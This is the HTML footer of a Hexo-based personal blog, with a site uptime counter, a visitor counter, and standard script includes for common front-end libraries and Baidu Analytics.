     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
